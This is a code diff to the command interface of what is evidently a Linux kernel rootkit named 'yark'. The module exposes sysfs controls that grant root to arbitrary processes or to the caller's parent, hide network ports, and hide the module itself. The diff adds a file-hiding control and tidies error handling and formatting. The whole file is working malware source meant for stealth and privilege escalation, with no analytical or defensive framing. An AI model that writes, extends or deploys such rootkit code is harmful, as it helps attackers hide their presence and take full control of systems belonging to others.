@@ -8,6 +8,7 @@
 #include <linux/sysfs.h>
 
 #include "command.h"
+#include "hide_file.h"
 #include "hide_port.h"
 #include "main.h"
 #include "give_root.h"
@@ -22,6 +23,7 @@
 #define SYS_DIR_NAME "yark"
 
 /* handlers for hide port */
+
 static ssize_t hide_port_kobj_list(struct kobject *kobj,
                                    struct kobj_attribute *attr, char *buf) {
     size_t remain_size = PAGE_SIZE;
@@ -73,17 +75,17 @@ static ssize_t hide_port_kobj_del(struct kobject *kobj,
 /* handlers for give root */
 
 static ssize_t give_root_kobj_giveme(struct kobject *kobj,
-                                   struct kobj_attribute *attr, char *buf) {
+                                     struct kobj_attribute *attr, char *buf) {
     int retval;
     retval = give_root_by_process_pid(current->parent->pid);
     if (retval < 0)
         return retval;
-    return 0;                          
+    return 0;
 }
 
 static ssize_t give_root_kobj_give(struct kobject *kobj,
-                                  struct kobj_attribute *attr, const char *buf,
-                                  size_t count) {
+                                   struct kobj_attribute *attr, const char *buf,
+                                   size_t count) {
     unsigned int pid;
     int retval;
 
@@ -100,8 +102,8 @@ static ssize_t give_root_kobj_give(struct kobject *kobj,
 /* handlers for hide module */
 
 static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
-                                  struct kobj_attribute *attr, const char *buf,
-                                  size_t count) {
+                                                struct kobj_attribute *attr,
+                                                const char *buf, size_t count) {
     unsigned int visibility;
     int retval;
 
@@ -109,9 +111,9 @@ static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
     if (retval)
         return retval;
 
-    if(visibility == 0){
+    if (visibility == 0) {
         hide_module();
-    }else if(visibility == 1){
+    } else if (visibility == 1) {
         show_module();
     }
     if (retval < 0)
@@ -122,6 +124,7 @@ static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
 static struct kobject *module_kobj;
 
 /* attribute for hide_port */
+
 static struct kobj_attribute hide_port_kobj_list_attribute =
     __ATTR(list, 0400, hide_port_kobj_list, NULL);
 static struct kobj_attribute hide_port_kobj_add_attribute =
@@ -139,6 +142,7 @@ static struct attribute_group hide_port_attr_group = {
 };
 
 /* attribute for give_root */
+
 static struct kobj_attribute give_root_kobj_give_attribute =
     __ATTR(give, 0200, NULL, give_root_kobj_give);
 
@@ -146,7 +150,8 @@ static struct kobj_attribute give_root_kobj_giveme_attribute =
     __ATTR(giveme, 0444, give_root_kobj_giveme, NULL);
 
 static struct attribute *give_root_attrs[] = {
-    &give_root_kobj_give_attribute.attr, &give_root_kobj_giveme_attribute.attr, NULL};
+    &give_root_kobj_give_attribute.attr, &give_root_kobj_giveme_attribute.attr,
+    NULL};
 
 static struct attribute_group give_root_attr_group = {
     .name = "give_root",
@@ -154,6 +159,7 @@ static struct attribute_group give_root_attr_group = {
 };
 
 /* attribute for hide_module */
+
 static struct kobj_attribute hide_module_kobj_visibility_attribute =
     __ATTR(vis, 0200, NULL, hide_module_kobj_give_visibility);
 
@@ -163,6 +169,64 @@ static struct attribute *hide_module_attrs[] = {
 static struct attribute_group hide_module_attr_group = {
     .name = "hide_module",
     .attrs = hide_module_attrs,
+};
+
+/* attribute for hide_file */
+
+static ssize_t hide_file_kobj_list(struct kobject *kobj,
+                                   struct kobj_attribute *attr, char *buf) {
+    size_t remain_size = PAGE_SIZE;
+    size_t offset = 0;
+    int count;
+    int bkt;
+    struct hide_file_info *cur;
+
+    hash_for_each(hide_file_info_list, bkt, cur, node) {
+        if (remain_size <= 0)
+            break;
+        count = scnprintf(buf + offset, remain_size, "%s\n", cur->path.name);
+        remain_size -= count;
+        offset += count;
+    }
+    return offset;
+}
+
+static ssize_t hide_file_kobj_add(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    int retval;
+
+    retval = hide_file_add(buf);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static ssize_t hide_file_kobj_del(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    int retval;
+
+    retval = hide_file_del(buf);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static struct kobj_attribute hide_file_kobj_list_attribute =
+    __ATTR(list, 0400, hide_file_kobj_list, NULL);
+static struct kobj_attribute hide_file_kobj_add_attribute =
+    __ATTR(add, 0200, NULL, hide_file_kobj_add);
+static struct kobj_attribute hide_file_kobj_del_attribute =
+    __ATTR(del, 0200, NULL, hide_file_kobj_del);
+
+static struct attribute *hide_file_attrs[] = {
+    &hide_file_kobj_list_attribute.attr, &hide_file_kobj_add_attribute.attr,
+    &hide_file_kobj_del_attribute.attr, NULL};
+
+static struct attribute_group hide_file_attr_group = {
+    .name = "hide_file",
+    .attrs = hide_file_attrs,
 };
 
 int command_start(void) {
@@ -177,19 +241,27 @@ int command_start(void) {
     /* create /sys/kernel/${SYS_DIR_NAME}/hide_port/ */
     retval = sysfs_create_group(module_kobj, &hide_port_attr_group);
     if (retval)
-        kobject_put(module_kobj);
+        goto failed;
     /* create /sys/kernel/${SYS_DIR_NAME}/give_root/ */
     retval = sysfs_create_group(module_kobj, &give_root_attr_group);
     if (retval)
-        kobject_put(module_kobj);
+        goto failed;
     /* create /sys/kernel/${SYS_DIR_NAME}/hide_module/ */
     retval = sysfs_create_group(module_kobj, &hide_module_attr_group);
     if (retval)
-        kobject_put(module_kobj);
+        goto failed;
+    /* create /sys/kernel/${SYS_DIR_NAME}/hide_file/ */
+    retval = sysfs_create_group(module_kobj, &hide_file_attr_group);
+    if (retval)
+        goto failed;
+    return retval;
+failed:
+    kobject_put(module_kobj);
     return retval;
 }
 
 void command_end(void) {
     pr_info(LOG_PREFIX "call command_end()\n");
-    kobject_put(module_kobj);
+    if (module_kobj)
+        kobject_put(module_kobj);
 }
